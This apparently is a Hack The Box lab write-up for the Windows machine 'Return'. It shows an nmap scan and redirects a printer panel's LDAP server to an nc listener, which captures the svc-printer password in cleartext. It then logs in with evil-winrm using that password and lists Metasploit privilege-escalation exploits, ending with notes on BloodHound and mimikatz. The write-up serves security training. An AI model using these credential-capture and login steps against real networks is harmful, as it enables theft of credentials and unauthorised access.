# Return

## Information Gathering

## Enumeration

Start with an nmap scan:

```s
$ sudo nmap -Pn -T4 -p- -A -oN nmap/all.nmap 10.10.11.108    
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-29 18:31 EDT
Nmap scan report for 10.10.11.108
Host is up (0.012s latency).
Not shown: 65510 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-29 22:50:45Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49682/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
```

### tcp/80

Navigating the the web application and viewing `http://10.10.11.108/settings.php` shows an interesting form. The form allows a user to update the server address, port, username, and password. Oddly enough, the password is already within the HTML, however it has been redacted so we can't view it. Lets try changing the server address to our address: `10.10.14.24` and starting up a `nc` listener on port 389

```s
$ nc -lnvp 389
listening on [any] 389 ...
connect to [10.10.14.24] from (UNKNOWN) [10.10.11.108] 63929
0*`%return\svc-printer
                      1edFg43012!!
```

After submitting the request we catch what appear to be a username and gibberish. This may be the password.

## Foothold

Lets try using the credentials to authenticate into the machine and get a shell.

```s
$ evil-winrm -i 10.10.11.108 -u "svc-printer" -p '1edFg43012!!'
*Evil-WinRM* PS C:\Users\svc-printer\Documents>
```
 
We're in

## Privilege Escalation

```
x 1   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The target appears to be vulnerable. Vulnerable Windows 10 v1809 build detected!
x 2   exploit/windows/local/cve_2020_1048_printerdemon               Yes                      The target appears to be vulnerable.
x 3   exploit/windows/local/cve_2020_1337_printerdemon               Yes                      The target appears to be vulnerable.
x 4   exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
x 5   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 24  exploit/windows/local/ms13_081_track_popup_menu                No                       Cannot reliably check exploitability.
 25  exploit/windows/local/ms14_058_track_popup_menu                No                       Cannot reliably check exploitability.
```


- Bloodhound `shortest path to high value targets`
- mimikatz